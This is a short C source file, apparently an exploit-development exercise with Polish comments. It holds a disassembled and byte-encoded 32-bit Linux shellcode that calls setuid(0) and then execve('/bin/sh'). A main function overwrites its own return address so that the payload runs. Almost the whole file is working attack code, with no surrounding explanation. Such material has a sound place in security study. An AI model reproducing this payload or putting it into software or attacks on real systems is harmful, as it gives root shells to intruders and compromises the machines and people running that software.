#include<unistd.h>
/* |0x56557020 <shellcode>          xor    eax,eax                                                   │
   │0x56557022 <shellcode+2>        xor    ebx,ebx                                                   │
   │0x56557024 <shellcode+4>        mov    al,0x17                                                   │
   │0x56557026 <shellcode+6>        int    0x80             ;setuid(0)                               │
   │0x56557028 <shellcode+8>        jmp    0x56557049 <shellcode+41>                                 │
   │0x5655702a <shellcode+10>       pop    esi ;absolutny adres '/bin/sh'                            │
   │0x5655702b <shellcode+11>       mov    DWORD PTR [esi+0x8],esi ;[esi + 8] = esi czyli pocz. stringa
   │0x5655702e <shellcode+14>       xor    eax,eax                                                   │
   │0x56557030 <shellcode+16>       mov    BYTE PTR [esi+0x7],al ; zero na koniec '/bin/sh'          │
   │0x56557033 <shellcode+19>       mov    DWORD PTR [esi+0xc],eax ;[esi + 12] = NULL                │
   │0x56557036 <shellcode+22>       mov    al,0xb ;syscall 0xb, czyli execve                         │
   │0x56557038 <shellcode+24>       mov    ebx,esi ;arg 1 = /bin/sh                                  │
   │0x5655703a <shellcode+26>       lea    ecx,[esi+0x8]; arg 2 = wskaźnik na /bin/sh                │
   │0x5655703d <shellcode+29>       lea    edx,[esi+0xc]; arg 3 = wskaźnik na NULL                   |
   │0x56557040 <shellcode+32>       int    0x80                                                      │
   │0x56557042 <shellcode+34>       xor    ebx,ebx                                                   │
   │0x56557044 <shellcode+36>       mov    eax,ebx
   │0x56557046 <shellcode+38>       inc    eax                                                       │
   │0x56557047 <shellcode+39>       int    0x80                                                      │
   │0x56557049 <shellcode+41>       call   0x5655702a <shellcode+10> ;odkłada na stos eip, a więc adres stringa '/bin/sh'
   │0x5655704e <shellcode+46>       das                                                              │
   │0x5655704f <shellcode+47>       bound  ebp,QWORD PTR [ecx+0x6e]                                  │
   │0x56557052 <shellcode+50>       das                                                              │
   │0x56557053 <shellcode+51>       jae    0x565570bd 
*/

//setuid(0);
//x[0] = "/bin/sh"
//x[1] = 0;
//execve("/bin/sh", &x[0], &x[1])
//exit(0);

char shellcode[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
                   "\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(int argc, char *argv[]) {
    int *ret;
    ret = (int *) &ret + 2;
    (*ret) = (int) shellcode;
}
